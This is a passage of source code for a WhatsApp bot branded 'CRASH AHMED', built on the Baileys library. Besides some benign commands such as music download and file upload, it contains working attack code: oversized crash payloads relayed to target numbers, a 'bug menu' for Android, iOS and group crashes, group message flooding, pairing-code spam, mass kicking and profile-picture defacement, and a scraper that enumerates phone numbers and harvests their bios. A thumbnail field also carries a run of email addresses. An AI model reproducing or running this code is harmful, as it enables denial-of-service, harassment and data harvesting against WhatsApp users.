                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await XeonBotInc.relayMessage(targetNumber, message, {
      messageId: null,
      userJid: targetNumber,
    });
}
    
//==============================================================\\     

if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}

switch(command) {   
 case 'abc': 
try {
var abc = generateWAMessageFromContent(from, proto.Message.fromObject({
  "interactiveMessage": {
    "header": {
      "imageMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQP7wd63yXXKBGyTnXbWfOd8pz15oedIJQPdQriIgxvs0kccuxcbO3GP46PBPAAgFeh_RSc2kQBRZ9Pk-iiGkPgLiajqRd7SU1w_KWpCDA?ccb=9-4&oh=01_Q5Aa3QEzDJBEkmN2UHZ7a0mwM4qgBS0JcR73wl3ZdoyD7WfqXA&oe=697AB630&_nc_sid=e6ed6c&mms3=true",
        "mimetype": "image/jpeg",
        "caption": "\n`Hi, 💀𝐀𝐇𝐌𝐄𝐃😈  BOT`\n\ni'am FLiX I am a WhatsApp bot created by @HAKERAHMED2 \n\n─|> 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁\n▢ Creator : FLIX\n▢ Bot Name : 💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\n▢ Version : 11.0.0\n▢ Prefix : \".\"\n\n─|> 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\n▢.crashmsg 『 Force Close 1 Msg 』\n▢.xcrash 『 Invisible Force Close 』\n▢.xdelay_hard 『 Delay Invisible 』\n\n─|> 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\n▢.addmurbug\n▢.delmurbug\n\n─|> 𝗔𝗱𝗺𝗶𝗻 𝗠𝗲𝗻𝘂\n▢.public\n▢.self\n▢.>\n▢.exec\n",
        "fileSha256": "Kfo8qv06uruUJRQ4roG6FVX9oTumfsXDfdzvSznsNms=",
        "fileLength": "2720488",
        "height": 1920,
        "width": 1080,
        "mediaKey": "7nwg8QsnFpFBGqOXkLvL3ZSRtussJ+JFAZX7DNoy59U=",
        "fileEncSha256": "UrlHHy9Re6eoarDwcfUO83QllZj9ZWgH1GvRNQvBSjU=",
        "directPath": "/o1/v/t24/f2/m233/AQOHeyLXggelEFqlSalGLT91RxwSII-4D0e_0-n2rJT_Ca4UkQlkSZAdDPF05Ayj88wXP2fQU0YfohFlLhhShdgbhUiuOOO1hyHUSmtf-A?ccb=9-4&oh=01_Q5Aa3QHpY82_EtDBhjxTpvkVKHDAOguVHAVjYhhUCBvKlE-W1Q&oe=697AA903&_nc_sid=e6ed6c",
        "mediaKeyTimestamp": "1767059382",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgANgMBIgACEQEDEQH/نوع خاص ب gايم.قسم.خاص.نوعhmdqsmalkaml@gmail.commark580000mark@gmail.comahmdqasmbdhlya@gmail.comabwzamdwasalzla5@gmail.comkalfn5800@gmail.comahmedqasm774@gmail.comgxjffgfffyd@gmail.comkamlfgggcfg@gmail.coma9565229@gmail.comzgvgffhgf@gmail.comgxjffgfffyd@gmail.comxAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQEGAQEBAQEAAAAAAAAAAAAAAAAAAQMC/9oADAMBAAIQAxAAAAD5kAAAD3y1a56aZpCG3GkRc/evx9M12U6skvb4nQ4iwHWCcC6KoJbqSwEAAAA//8QAJhAAAgIBAwMDBQAAAAAAAAAAAQIAAyEEERIQMUEFExQiJDBAUf/aAAgBAQABPwD84G5hBEVd/EKfyHHWkb2LL6wDyPaBUxhsyyorWMGE79ANyBNJpk5gbz1Efcqg7ATmEKkDImhX5eksa3uDgzU0ovIg9ab3rYTUNXqVUseLjzBTn6rVAjalU03t1YQRnZyST1BHmHKgRseTFs2Qr+j/AP/EABoRAAICAwAAAAAAAAAAAAAAAAABEDERIDD/2gAIAQIBAT8A1yKGWW+X/8QAIBEAAgIABgMAAAAAAAAAAAAAAQIAERASICExUQMyYf/aAAgBAwEBPwDQosgQplYixtHULh42UX2eD1BaZgRPRKbfNwOsAaha4WJr5q//2Q==",
        "annotations": [
          {
            "polygonVertices": [
              {
                "x": 60.71664810180664,
                "y": -36.39784622192383
              },
              {
                "x": -16.710189819335938,
                "y": 49.263675689697266
              },
              {
                "x": -56.585853576660156,
                "y": 37.85963439941406
              },
              {
                "x": 20.840980529785156,
                "y": -47.80188751220703
              }
            ],
            "newsletter": {
              "newsletterJid": "120363386423395618@newsletter",
              "newsletterName": "💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 ",
              "contentType": "UPDATE",
              "accessibilityText": ""
            }
          }
        ]
      },
      "hasMediaAttachment": true
    },
    "body": {
      "text": "\n` Hello, 💀𝐀𝐇𝐌𝐄𝐃😈 `\n\ni'am FLIX I am a WhatsApp bot created by @HAKERAHMED2 \n\n─|> 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁\n▢ Creator : FLIX\n▢ Bot Name : 💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\n▢ Version : 11.0.0\n▢ Prefix : \".\""
    },
    "footer": {
      "text": "FLIX"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "single_select",
          "buttonParamsJson": "{\"has_multiple_buttons\":true}"
        },
        {
          "name": "call_permission_request",
          "buttonParamsJson": "{\"has_multiple_buttons\":true}"
        },
        {

          "name": "quick_reply",

          "buttonParamsJson": "{\"display_text\":\"allmenu\",\"id\":\".menu\"}"

        },  
        {
     
          "name": "single_select",
          "buttonParamsJson": "{\"title\":\"Info Update Script\",\"sections\":[{\"title\":\"INFORMATION\",\"highlight_label\":\"label\",\"rows\":[{\"title\":\"CHANNEL\",\"description\":\"https:\\/\\/whatsapp.com\\/channel\\/0029Vb2QAwr17EmtV7jvyh1q\\n\\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.\",\"id\":\"row_1\"},{\"title\":\"CHANEL TELEGRAM\",\"description\":\"t.me\\/\",\"id\":\"row_2\"},{\"title\":\"CONTACT DEVELOPER\",\"description\":\"*TELEGRAM*\\nt.me\\/flashaudio\\n\\n*WHATSAPP*\\n+967774772074\",\"id\":\"row_3\"}]}],\"has_multiple_buttons\":true}"
        },
        {
          "name": "cta_copy",
          "buttonParamsJson": "{\"display_text\":\"💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\",\"id\":\"123456789\",\"copy_code\":\"https:\\/\\/t.me\\/flashaudio\"}"
        },
        {
          "name": "cta_call",
          "buttonParamsJson": "{\"display_text\":\"Call Developer\",\"phone_number\":\"+967774772074\"}"
        },
        {
          "name": "quick_reply",
          "buttonParamsJson": "{\"display_text\":\"contact Developer\",\"id\":\".owner\"}"
        },
        
      ],
      "messageParamsJson": "{\"limited_time_offer\":{\"text\":\"💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\",\"url\":\"t.me/flashaudio\",\"copy_code\":\"💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\",\"expiration_time\":1765291537095309},\"bottom_sheet\":{\"in_thread_buttons_limit\":2,\"divider_indices\":[1,2,3,4,5,999],\"list_title\":\"💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\",\"button_title\":\"💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕11 Vip\"},\"tap_target_configuration\":{\"title\":\"▸ X ◂\",\"description\":\"bomboclard\",\"canonical_url\":\"https://t.me/flashaudio\",\"domain\":\"shop.example.com\",\"button_index\":0}}"
    },
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA"
    }
  }
}),{ userJid: from })
XeonBotInc.relayMessage(from, abc.message, {messageId: abc.key.id })
} catch (e) {
console.log(e)
}
break
  case 'menu': {

  const axios = require('axios')
  const run = runtime(process.uptime())

  const {
    generateWAMessageContent,
    generateWAMessageFromContent
  } = require('@adiwajshing/baileys')

  //
  global.menuImageCache = global.menuImageCache || {}

  try {
    const categories = [
      {
        title: "𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
> HELLO : ♡${m.pushName}
> RUNTIME : ${run}
> 💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
> public
> self
> addprem
> reqpair
> delpair
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029VbBErtO8KMqmc3Ex693G"
        },
        image: "https://files.catbox.moe/1o3m5v.jpg"
      },
      {
        title: "𝗕𝗨𝗚 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
> HELLO : ♡${m.pushName}
> RUNTIME : ${run}
> 💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
     ☆android☆
> xcrash
> xnxx
> xdelay
> crashchatt
> crashcall
     ☆ios☆
> crashios
     ☆group☆
> groupmix +id 
> kickall
> groupdelay +id
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029VbBErtO8KMqmc3Ex693G"
        },
        image: "https://files.catbox.moe/rnhlfx.jpg"
      },
      {
        title: "𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨",
        desc: `
▬▬▬▬▬▬▬▬▬▬▬
> HELLO : ♡${m.pushName}
> RUNTIME : ${run}
> 💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕IP
▬▬▬▬▬▬▬▬▬▬▬
     ^tools^
> ddos
> xpairspam
> cekdevice
> makecase 
> autoswview on/off
> ping
> idch
> play
> forceblock
     ☆group☆
> listgs
> groupid
▬▬▬▬▬▬▬▬▬▬▬
        `,
        button: {
          text: "𝗖𝗢𝗠𝗠𝗨𝗡𝗜𝗧𝗬",
          url: "https://whatsapp.com/channel/0029VbBErtO8KMqmc3Ex693G"
        },
        image: "https://files.catbox.moe/1o3m5v.jpg"
      }
    ]

    const carouselCards = await Promise.all(
      categories.map(async (item, index) => {
        let imageMsg = global.menuImageCache[item.image]

        if (!imageMsg) {
          const res = await axios.get(item.image, { responseType: 'arraybuffer' })

          imageMsg = (
            await generateWAMessageContent(
              { image: Buffer.from(res.data) },
              { upload: XeonBotInc.waUploadToServer }
            )
          ).imageMessage

          global.menuImageCache[item.image] = imageMsg
        }

        return {
          header: {
            title: item.title,
            hasMediaAttachment: true,
            imageMessage: imageMsg
          },
          body: { text: item.desc },
          footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: item.button.text,
                  url: item.button.url,
                  merchant_url: item.button.url
                })
              }
            ]
          }
        }
      })
    )

    const carouselMessage = generateWAMessageFromContent(
      from,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "千ㄥ丨乂" },
              footer: { text: "TEAM💀𝐂𝐑𝐀𝐒𝐇.💀𝐀𝐇𝐌𝐄𝐃😈 -𝐕IP" },
              carouselMessage: {
                cards: carouselCards
              }
            }
          }
        }
      },
      { quoted: m }
    )

    await XeonBotInc.relayMessage(from, carouselMessage.message, {
      messageId: carouselMessage.key.id
    })

  } catch (err) {
     console.error("❌ Menu command error:", err)
    replygcxeon("⚠️ Failed to load menu. Please try again later.")
  }
}
break      
               
 case 'play':
case 'شغل':
case 'spotify': {
  /*  if (!m.isOwner && !m.isCreator) {
        return m.reply('❌ هذا الأمر للمالكين فقط');
    }*/
    
    try {
        if (!args.length) {
            return replygcxeon(`🎵 اكتب اسم الأغنية!\nمثال: ${prefix}اغنية Shape of you`);
        }

        const query = args.join(" ").trim();
        await m.reply("🔎 جاري البحث عن الأغنية...");

        // البحث في يوتيوب
        
        const searchResult = await yts(query);
        
        if (!searchResult.videos.length) {
            return replygcxeon("❌ لم يتم العثور على الأغنية");
        }

        const video = searchResult.videos[0];
        const videoUrl = video.url;
        const videoTitle = video.title;

        await replygcxeon(`🎵 *${videoTitle}*\n⏳ جاري التحميل...`);

        // تحميل الصوت
        
        const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
        ffmpeg.setFfmpegPath(ffmpegPath);

        const tempDir = './temp';
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }

        const timestamp = Date.now();
        const safeTitle = videoTitle.replace(/[\\\/:*?"<>|]/g, "").slice(0, 100);
        const filePath = path.join(tempDir, `song_${timestamp}.mp3`);

        // تحميل الصوت
        await new Promise((resolve, reject) => {
            const stream = ytdl(videoUrl, { 
                filter: 'audioonly',
                quality: 'highestaudio'
            });

            ffmpeg(stream)
                .audioBitrate(128)
                .save(filePath)
                .on('end', resolve)
                .on('error', reject);
        });

        // إرسال الأغنية
        const audioBuffer = fs.readFileSync(filePath);
        
        await XeonBotInc.sendMessage(
            m.chat,
            {
                audio: audioBuffer,
                mimetype: "audio/mpeg",
                fileName: `${safeTitle}.mp3`
            },
            { quoted: m }
        );

        // تنظيف الملفات
        try { fs.unlinkSync(filePath); } catch (e) {}

    } catch (error) {
        console.error("❌ خطأ:", error);
        await replygcxeon(`💥 حدث خطأ: ${error.message}`);
    }
    break;
}
    
  
case 'com': {
    if (!text) return (`*example:*\n ${prefix + command} +20XXX`);
    let target = `${q.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
    await albumbuggers2(target, true);
    await albumbuggers1(target, true);
    replygcxeon(`*success send bug ${command} to ${target}*`);
  console.log(chalk.green(`succes send bugs to ${target}`))
}

break    
            
case 'device': case 'checkdevice': case 'cekdevice': {
if (!isBot && !isCreator) return
  if (!isBot) return;

  const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedMessageId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quotedMsg || !quotedMessageId) {
    await XeonBotInc.sendMessage(from, { text: 'Quote The Target Message' }, { quoted: m });
    break;
  }

  const devicec = 
    quotedMessageId.length > 21
      ? 'Device: Android'
      : quotedMessageId.startsWith('3A')
        ? 'Device: iOS'
        : 'Device: WhatsApp Web or BotAPI';

  await XeonBotInc.sendMessage(from, { text: devicec }, { quoted: m });
  }
  break;
        
case "tourl": {
      if (!isBot && !isCreator) return
  if (!/image|video/.test(mime)) return replygcxeon('Kirim atau reply gambar/video yang ingin diubah ke URL!');

  const fetch = (await import('node-fetch')).default;
  const FormData = (await import('form-data')).default;
  const { ImageUploadService } = require('node-upload-images');
  const { fromBuffer } = require('file-type');
  const mediaData = m.quoted ? await m.quoted.download() : await m.download();

  // Fungsi upload ke pixhost.to (untuk gambar)
  async function uploadPixhost(buffer) {
    const service = new ImageUploadService('pixhost.to');
    const { directLink } = await service.uploadFromBinary(buffer, 'upload.png');
    return directLink;
  }

  // Fungsi upload ke catbox.moe (untuk gambar & video)
  async function uploadCatbox(buffer) {
    let { ext } = await fromBuffer(buffer);
    let bodyForm = new FormData();
    bodyForm.append("fileToUpload", buffer, "file." + ext);
    bodyForm.append("reqtype", "fileupload");
    let res = await fetch("https://catbox.moe/user/api.php", {
      method: "POST",
      body: bodyForm
    });
    return await res.text();
  }

  let url;
  if (/image/.test(mime)) {
    try {
      url = await uploadPixhost(mediaData);
    } catch {
      url = await uploadCatbox(mediaData);   }
  } else {
    url = await uploadCatbox(mediaData);
  }

  await XeonBotInc.sendMessage(m.chat, { text: `*Url :* ${url}\n*Expired :* Permanen` }, { quoted: m });
}
break  

case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
if (!isBot && !isCreator) return
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
		
case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await XeonBotInc.newsletterMetadata("invite", channelId);
        await XeonBotInc.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;	
	
 case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 919402104403*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

case 'xxxban': case 'xx🦄': {
	// Check if botNumber or sender is in global.banner
    if (global.banner.includes(botNumber) || !global.banner.includes(senderNumber)) {
        return;
    }
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const imageUrl = "https://raw.githubusercontent.com/ 13/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // Download the image
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // Change bot's profile picture
            await XeonBotInc.updateProfilePicture(XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net", { url: imagePath });

            // Fetch all groups
            let allGroups = Object.values(await XeonBotInc.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // Filter out blacklisted groups
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // Update profile pictures in each group
            for (let groupId of targetGroups) {
                try {
                    await XeonBotInc.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // Wait 1 second between updates
            }

            // Clean up & send message
            fs.unlinkSync(imagePath);
        })();
    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;
	
case 'promoteall': {
if (!isBot && !isCreator) return
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demoteall': {
if (!isBot && !isCreator) return
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;

case 'kickall': {
    if (!isBot && !isCreator) return
    if (!m.isGroup) 
        return replygcxeon("هذا الأمر يعمل فقط داخل المجموعات.");

    

    // إذا كان هناك منشن أو رقم → طرد شخص واحد فقط
    if (m.mentionedJid && m.mentionedJid.length > 0 || args[0]) {
        // كود طرد شخص واحد (نفس الكود القديم)
        let target;
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            target = m.mentionedJid[0];
        } else if (args[0]) {
            target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        } else {
            return replygcxeon("❗ برجاء منشن الشخص أو كتابة رقمه.\nمثال:\n.kick @user\n.kick 20123456789");
        }

        const isTargetAdmin = participants.find(v => v.id === target)?.admin !== null;
        if (isTargetAdmin) 
            return replygcxeon("لا يمكن طرد عضو من المشرفين.");

        try {
            await XeonBotInc.groupParticipantsUpdate(from, [target], 'remove');
            replygcxeon(`✔️ تم طرد العضو:\n@${target.split('@')[0]}`, { mentions: [target] });
        } catch (err) {
            console.log(err);
            replygcxeon("حدث خطأ أثناء محاولة طرد العضو.");
        }
    } 
    // إذا لم يكن هناك منشن → طرد جميع الأعضاء
    else {
        // كود طرد جميع الأعضاء (الكود الجديد)
        const groupMembers = participants;
        const membersToKick = [];
        
        for (let member of groupMembers) {
            if (member.id === XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net') continue;
            if (member.admin) continue;
            membersToKick.push(member.id);
        }

        if (membersToKick.length === 0) 
            return replygcxeon("❌ لا يوجد أعضاء عاديين يمكن طردهم.");

        try {
            replygcxeon(`⚡ جاري طرد ${membersToKick.length} عضو...`);
            
            for (let i = 0; i < membersToKick.length; i += 500) {
                const batch = membersToKick.slice(i, i + 500);
                await XeonBotInc.groupParticipantsUpdate(from, batch, 'remove');
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            replygcxeon(`✅ تم طرد ${membersToKick.length} عضو بنجاح.`);
            
        } catch (err) {
            console.log(err);
            replygcxeon("❌ حدث خطأ أثناء محاولة طرد الأعضاء.");
        }
    }
}
break;
       
case 'forcegroup':
    
    if (!isBot && !isCreator) return
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .groupid link`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`Successfully sent force message to the group chat`);

    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(victimxd, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'xprz': {
           if (!isBot && !isCreator) return
 if (!q) return replygcxeon(`Example : ${command} 20xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
 let targetto = pepec
const { 
  default: makeWaSocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion
} = require("@adiwajshing/baileys")
const pino = require('pino')

async function zprz(target) {
  let { state } = await useMultiFileAuthState('.npm')
  let { version } = await fetchLatestBaileysVersion()
  let XeonBotInc = await makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: 'fatal' })
  })

  console.log(`start spam pairing to ${target}`)

  const deadline = Date.now() + 10_000
  for (let z = 0; z < 150; z++) {
    await sleep(9000)
    let prc = await XeonBotInc.pairingBug(target)
  }
}
rDone(`[ √ ] Success Bug : ${pepec}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
await zprz(targetto)
}
break
	
case 'forceblock':
if (!isBot && !isCreator) return
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
